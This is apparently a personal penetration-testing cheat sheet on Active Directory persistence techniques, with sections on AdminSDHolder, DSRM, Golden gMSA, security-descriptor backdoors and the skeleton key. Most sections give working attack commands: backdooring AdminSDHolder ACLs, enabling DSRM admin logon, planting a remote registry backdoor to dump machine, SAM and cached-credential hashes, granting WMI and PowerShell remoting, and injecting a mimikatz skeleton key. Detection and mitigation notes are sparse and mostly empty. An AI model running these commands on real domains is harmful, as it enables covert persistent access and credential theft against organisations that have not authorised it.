---
layout: post
title: pen / ad / persist
category: pen
parent: cheatsheets
modified_date: 2024-12-02
permalink: /pen/ad/persist
---

**Menu**
<!-- vscode-markdown-toc -->
* [adminsdholder](#adminsdholder)
* [dacl-abuse](#dacl-abuse)
* [dc-shadow](#dc-shadow)
* [dsrm](#dsrm)
* [golden-gmsa](#golden-gmsa)
* [security-descriptors](#security-descriptors)
	* [DCOM](#DCOM)
	* [Powershell](#Powershell)
	* [Registry](#Registry)
	* [SC Manager](#SCManager)
	* [WMI](#WMI)
* [skeleton-key](#skeleton-key)

<!-- vscode-markdown-toc-config
	numbering=false
	autoSave=true
	/vscode-markdown-toc-config -->
<!-- /vscode-markdown-toc -->


## <a name='adminsdholder'></a>adminsdholder

🔑 KEYPOINTS :
- special AD container with some "default" security permissions that is used as a template for protected AD accounts and groups
- roll backs the security permissions for protected accounts and group every 60 minutes, aka the Security Descriptor Propagator Update (SDProp) process.

▶️ PLAY :
```powershell
# add the user to the adminsdholder group 
Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName spotless -Verbose -Rights All

# check the user has genericAll over the 'Domain Admins' group
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}

# add the user back to the 'Domain Admins' group
net group "domain admins" spotless /add /domain
```

🔎️ DETECT :
```powershell
# find all users with security ACLs set by SDProp using the PowerShell AD cmdlets
Import-Module ActiveDirectory
Get-ADObject -LDAPFilter “(&(admincount=1)(|(objectcategory=person)(objectcategory=group)))” -Properties MemberOf,Created,Modified,AdminCount

# monitor the ACLs configured on the AdminSDHolder object. These should be kept at the default – it is not usually necessary to add other groups to the AdminSDHolder ACL.

# monitor users and groups with AdminCount = 1 to identify accounts with ACLs set by SDProp.

```

🛟 MITIGATE :
```powershell
```

🕮 READ MORE at :
- [thehacker.recipes/ad/persistence/adminsdholder](https://www.thehacker.recipes/ad/persistence/adminsdholder).
- [ired.team/abuse-adminsdholder](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)
- [adsecurity.org/adminsdholder](https://adsecurity.org/?p=1906)


## <a name='dacl-abuse'></a>dacl-abuse

🔑 KEYPOINTS :

<img src="https://github.com/jomivz/jomivz.github.io/blob/master/assets/images/win_00_sys_sd_ace.jpg" width="600"> <img src="https://github.com/jomivz/jomivz.github.io/blob/master/assets/images/ad-persist-dacl-abuse-mindmap-thehackerrecipes.png" width="400">

▶️ PLAY :
```powershell
```

🔎️ DETECT :
```powershell
```

🛟 MITIGATE :
```powershell
```

🕮 READ MORE at :
- [thehacker.recipes/ad/movement/dacl](https://www.thehacker.recipes/ad/movement/dacl/).
- [thehacker.recipes/ad/persistence/dacl](https://www.thehacker.recipes/ad/persistence/dacl/).
- [ired.team/abusing-active-directory-acls-aces](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)


## <a name='dc-shadow'></a>dc-shadow

🔑 KEYPOINTS :
- tbd 

▶️ PLAY :
```powershell
```

🔎️ DETECT :
```powershell
```

🛟 MITIGATE :
```powershell
```

🕮 READ MORE at :
- [thehacker.recipes/ad/persistence/dcshadow](https://www.thehacker.recipes/ad/persistence/dcshadow/).
- [ired.team/dcshadow](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)


## <a name='dsrm'></a>dsrm

🔑 KEYPOINTS :
- DSRM stands for 'Directory Services Restore Mode'
- allows remote access to the DC for the local admin accounts
- dump of local admins hash is required + activation of the feature in the **registry** 

▶️ PLAY :
```powershell
# check if the key exists and get the value
Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior 

# create key with value "2" if it doesn't exist
New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD 

# change value to "2"
Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2  
``` 

🔎️ DETECT :
```powershell
# EID: 4657 - Registry value modified
# EID: 12 - Registry Object Created/Deletion (sysmon)
```

🛟 MITIGATE :
```powershell
```

🕮 READ MORE at :
- [hacktricks.xyz/dsrm-credentials](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dsrm-credentials)

## <a name='golden-gmsa'></a>golden-gmsa

🔑 KEYPOINTS :
- Group Managed Service Accounts (gMSA), which are managed directly by AD, with a strong password and a regular password rotation
- password are computed based on KDS root keys + gMSA account 'msDS-ManagedPassword' attribute value
- hack implemented by [semperis/goldenGMSA](https://github.com/Semperis/GoldenGMSA) tool 

▶️ PLAY :
```powershell
# enumerate KDS root keys,  SID, RootKeyGuid, Password ID
GoldenGMSA.exe gmsainfo

# enumeration for a single gMSA
GoldenGMSA.exe gmsainfo --sid "S-1-5-21-[...]1586295871-1112"
```

🔎️ DETECT :
```powershell
```

🛟 MITIGATE :
```powershell
```

🕮 READ MORE at :
- [thehacker.recipes/ad/persistence/goldengmsa](https://www.thehacker.recipes/ad/persistence/goldengmsa).
- [trustedsec](https://www.trustedsec.com/blog/splunk-spl-queries-for-detecting-gmsa-attacks)


## <a name='security-descriptors'></a>security-descriptors

🔑 KEYPOINTS :

▶️ PLAY :

### <a name='DCOM'></a>DCOM

- [DEMO DCOM backdoor](https://www.youtube.com/watch?v=e-tYtfmcoWk)

<img src="https://github.com/jomivz/jomivz.github.io/blob/master/assets/images/ad-persist-sd-DCOM-invoke-dcombackdoor.png" width="500"> <img src="https://github.com/jomivz/jomivz.github.io/blob/master/assets/images/ad-persist-sd-DCOM-invoke-dcombackdoortrigger.png" width="500">

```powershell
# set-RemoteDCOM
```

### <a name='Powershell'></a>Powershell

<img src="https://github.com/jomivz/jomivz.github.io/blob/master/assets/images/ad-persist-sd-PS-set-remotePSRemoting.png" width="500">

```powershell
# grant PS remote execution to a user
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose

# remove the grant of PS remote execution
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove
```

### <a name='Registry'></a>Registry

- [DEMO remote registry](https://www.youtube.com/watch?v=pOHO3hdTKyw)

<img src="https://github.com/jomivz/jomivz.github.io/blob/master/assets/images/ad-persist-sd-REG-add-regbackdoor.png" width="500"> <img src="https://github.com/jomivz/jomivz.github.io/blob/master/assets/images/ad-persist-sd-REG-add-regbackdoor2.png" width="500">
<img src="https://github.com/jomivz/jomivz.github.io/blob/master/assets/images/ad-persist-sd-REG-get-machinehash2.png" width="500"> <img src="https://github.com/jomivz/jomivz.github.io/blob/master/assets/images/ad-persist-sd-REG-get-machinehash.png" width="500">
<img src="https://github.com/jomivz/jomivz.github.io/blob/master/assets/images/ad-persist-sd-REG-invoke-remoteregbackdoor.png" width="500">

```powershell
# allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```

### <a name='SCManager'></a>SC Manager

- [DEMO SCM backdoor](https://www.youtube.com/watch?v=tETNO22zVKM) / service creation

<img src="https://github.com/jomivz/jomivz.github.io/blob/master/assets/images/ad-persist-sd-SCM-add-scmsd.png" width="500"> <img src="https://github.com/jomivz/jomivz.github.io/blob/master/assets/images/ad-persist-sd-SCM-sc-create.png" width="500">
<img src="https://github.com/jomivz/jomivz.github.io/blob/master/assets/images/ad-persist-sd-SCM-services.msc.png" width="500">

```powershell
```

### <a name='WMI'></a>WMI

- [DEMO WMI backdoor](https://www.youtube.com/watch?v=C1OpX_n7HlY)

<img src="https://github.com/jomivz/jomivz.github.io/blob/master/assets/images/ad-persist-sd-WMI-invoke-wmimethod.png" width="500"> <img src="https://github.com/jomivz/jomivz.github.io/blob/master/assets/images/ad-persist-sd-WMI-set-remotewmi.png" width="500">
<img src="https://github.com/jomivz/jomivz.github.io/blob/master/assets/images/ad-persist-sd-WMI-set-wmipersist.png" width="500">

```powershell
# grant WMI remote execution to a user
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose

# remove the grant of WMI remote execution
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose
```

🕮 READ MORE at :
- [hacktricks/security-descriptors](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/security-descriptors)
- [edemilliere / Invoke-ADSDPropagation](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1)


## <a name='skeleton-key'></a>skeleton-key

🔑 KEYPOINTS :
- hack that injects a master password into the lsass process on a DC
- enables the adversary to authenticate as any user without password
- does not persist to reboot

▶️ PLAY :
```powershell
# execution on a DC
invoke-mimi 'misc::skeleton'
```

🔎️ DETECT :
```powershell
```

🛟 MITIGATE :
```powershell
```

🕮 READ MORE at :
- [thehacker.recipes/ad/persistence/skeleton-key](https://www.thehacker.recipes/ad/persistence/skeleton-key/).